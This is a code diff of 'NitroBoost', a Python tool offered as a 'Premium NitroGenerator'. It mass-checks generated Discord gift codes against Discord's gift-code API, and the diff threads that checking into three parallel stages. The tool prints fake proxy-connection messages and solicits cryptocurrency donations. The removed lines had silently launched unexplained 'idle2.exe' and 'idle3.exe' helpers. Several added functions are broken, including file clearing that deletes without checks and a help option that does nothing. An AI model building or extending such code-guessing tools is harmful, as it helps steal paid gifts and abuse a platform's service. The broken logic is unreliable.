@@ -85,94 +85,82 @@ def clearfile(): # Clear file
     print("clearing file")
     if os.path.exists("16bytecodes.txt"):
         os.remove("16bytecodes.txt")
-    elif os.path.exists("4bytecodes.txt"):
         os.remove("4bytecodes.txt")
-    elif os.path.exists("20bytecodes"):
-        os.remove("20bytecodes")
+        os.remove("20bytecodes.txt")
+        print("Cleared files")
     else:
         print("Codes are already cleared")
-
     time.sleep(1)
-    print("Done")
     input("press enter to continue")
     boot()
 
-def chk(): # Check Codes
+def chk(): # Check Codes #
     print("\033[1;35;40m Connecting to proxies \n")
     time.sleep(1)
     print("\033[1;35;40m Connected \n")
     print("checking nitro codes")
-    # Stage 1 #
-    Popen('python idle2.py')
-    Popen('python idle2.exe')
-    time.sleep(0.5)
-    Popen('python idle3.py')
-    Popen('python idle3.exe')
+    threading.Thread(target=stage1).start()
+    threading.Thread(target=stage2).start()
+    threading.Thread(target=stage3).start()
+    # Run check 1 #
+def stage1():
     with open("16bytecodes.txt") as f:
         for line in f:
             nitro = line.strip("\n")
-
             url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
-
             r = requests.get(url)
-
             if r.status_code == 200:
                 print("\033[1;31;40m Valid | {} \n".format(line.strip("\n")))
                 break
             else:
                 print("\033[1;31;40m Invalid | {} \n".format(line.strip("\n")))
-                
-        # Stage 2 #
-        #with open("4bytecodes.txt") as f:
-            #for line in f:
-                #nitro = line.strip("\n")
-    
-                #url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
-
-                #r = requests.get(url)
-
-                #if r.status_code == 200:
-                    #print("\033[1;31;40m Valid | {} \n".format(line.strip("\n")))
-                    #break
-                #else:
-                    #print("\033[1;31;40m Invalid | {} \n".format(line.strip("\n")))
-        # Stage 3 #
-        #with open("20bytecodes.txt") as f:
-            #for line in f:
-                #nitro = line.strip("\n")
-
-                #url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
-
-                #r = requests.get(url)
-
-                #if r.status_code == 200:
-                    #print("\033[1;31;40m Valid | {} \n".format(line.strip("\n")))
-                    #break
-                #else:
-                    #print("\033[1;31;40m Invalid | {} \n".format(line.strip("\n")))
-                
+    # Stage 2 #
+def stage2():
+    with open("4bytecodes.txt") as f:
+        for line in f:
+            nitro = line.strip("\n")
+            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
+            r = requests.get(url)
+            if r.status_code == 200:
+                print("\033[1;31;40m Valid | {} \n".format(line.strip("\n")))
+                break
+            else:
+                print("\033[1;31;40m Invalid | {} \n".format(line.strip("\n")))
+# Stage 3 #
+def stage3():
+    with open("20bytecodes.txt") as f:
+        for line in f:
+            nitro = line.strip("\n")
+            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
+            r = requests.get(url)
+            if r.status_code == 200:
+                print("\033[1;31;40m Valid | {} \n".format(line.strip("\n")))
+                break
+            else:
+                print("\033[1;31;40m Invalid | {} \n".format(line.strip("\n")))            
 def menu(): # Logo
     os.system("cls")
     ctypes.windll.user32.MessageBoxW(0, "Thank you for using NitroBoost!", "Enjoy!", 0)
+    print("\033[1;36;40m  \n")
     print("""
-    
-███╗░░██╗██╗████████╗██████╗░░█████╗░██████╗░░█████╗░░█████╗░░██████╗████████╗
-████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
-██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║██████╦╝██║░░██║██║░░██║╚█████╗░░░░██║░░░
-██║╚████║██║░░░██║░░░██╔══██╗██║░░██║██╔══██╗██║░░██║██║░░██║░╚═══██╗░░░██║░░░
-██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝██████╦╝╚█████╔╝╚█████╔╝██████╔╝░░░██║░░░
-╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░░╚════╝░╚═════╝░░░░╚═╝░░░
+   _______  ___________  _  _______________  ____ 
+  / __/ _ \/ __/ __/ _ \/ |/ /  _/_  __/ _ \/ __ |
+ _\ \/ ___/ _// _// // /    // /  / / / , _/ /_/ /
+/___/_/  /___/___/____/_/|_/___/ /_/ /_/|_|\____/ 
 Premium NitroGenerator
-By : PackedUP103
-Support : NitroBoost_TCC#7798
-Version 1.1
-Mode - DEBUG-MODE
+By : PackedUP32
+Version 1.5
+Mode - RELEASE (SOURCE)
     """)
 
 def don():
     os.system("cls")
-    print("To donate send money to BTC")
-    print("bc1q65m46qwepnd5c5glufcnx94y72wv5yu2yl8d2a")
+    print("Buy me a coffee?")
+    print("Bitcoin = bc1qj4q6352ypmusyghyyp68q02l8hxvhvnyjnj39j")
+    print("Bitcoin Cash = bitcoincash:qq0344acxvjl9xy0vlftl38awjmg3mhz5qcwsgfsd5")
+    print("Xrdp = rBSPTqYrsSkjCwk8AUfpa3eVYczX4GDGmN")
+    print("Dodge Coin = DDZBYK8JdTA2umQnmpSH7n89pfqujdfXg1")
+    print("Ethereum = 0xE343279109A1Bf25f1A888E5B45c55EeD7245174")
     print("Thank you")
     input("Press enter to continue")
     boot()
@@ -180,7 +168,7 @@ def don():
 def options(): # Options
     print("\033[1;35;40m [1] Nitro Generator \n")
     print("\033[1;35;40m [2] Nitro Checker \n")
-    print("\033[1;35;40m [3] Donate \n")
+    print("\033[1;35;40m [3] Donate (Please donate so i can do more work like this) \n")
     print("\033[1;35;40m [4] Clear codes.txt file \n")
     print("\033[1;35;40m [5] Help Document \n")
     time.sleep(1)
@@ -205,8 +193,9 @@ def options(): # Options
         clearfile()
 
     elif user_name == "5":
-        os.system("help.bat")
-        print("Press enter to continue")
+        os.system("cls")
+        with open("20bytecodes.txt") as f:
+            lines = f.readlines()
         input()
         menu()
         options()
@@ -224,4 +213,3 @@ def boot():
     options()
 boot()
 print("Press enter to continue")
-input()
